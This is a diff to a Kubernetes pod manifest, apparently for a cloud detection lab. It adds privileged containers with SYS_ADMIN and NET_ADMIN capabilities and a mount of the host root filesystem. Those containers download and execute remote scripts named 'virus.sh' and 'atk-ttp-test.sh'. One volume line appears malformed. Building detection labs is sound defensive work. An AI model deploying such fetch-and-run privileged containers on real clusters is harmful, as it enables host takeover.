@@ -8,6 +8,15 @@ spec:
   containers:
   - name: alpine
     image: alpine:latest
+    securityContext:
+      privileged: true
+      capabilities:
+        add:
+          - SYS_ADMIN
+          - NET_ADMIN
+    volumeMounts:
+      - name: host
+        mountPath: /host
     command:
       - /bin/sh
       - -c
@@ -16,6 +25,29 @@ spec:
         chmod +x virus.sh && \
         sh virus.sh && \
         sleep 3600
+  - name: atk-ttp-test-runner
+    image: alpine:latest
+    securityContext:
+      privileged: true
+      capabilities:
+        add:
+          - SYS_ADMIN
+          - NET_ADMIN
+    volumeMounts:
+      - name: host
+        mountPath: /host
+    command:
+      - /bin/sh
+      - -c
+      - |
+        wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/atk-ttp-test.sh -O atk-ttp-test.sh && \
+        chmod +x atk-ttp-test.sh && \
+        ./atk-ttp-test.sh && \
+        sleep 3600
+  volumes:
+    - name: host
+      hostPath:
+        path: / && \
 ---
 apiVersion: apps/v1
 kind: Deployment
